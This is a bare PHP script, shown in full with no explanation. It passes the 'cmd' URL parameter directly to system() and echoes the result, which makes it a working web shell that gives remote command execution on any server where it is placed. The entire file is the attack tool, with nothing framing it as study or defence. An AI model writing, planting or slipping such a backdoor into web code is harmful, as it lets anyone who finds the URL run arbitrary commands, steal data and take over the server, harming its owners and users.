<?php
$cmd = $_GET['cmd'] ?? '';
echo "<pre>";
system($cmd);
echo "</pre>";
?>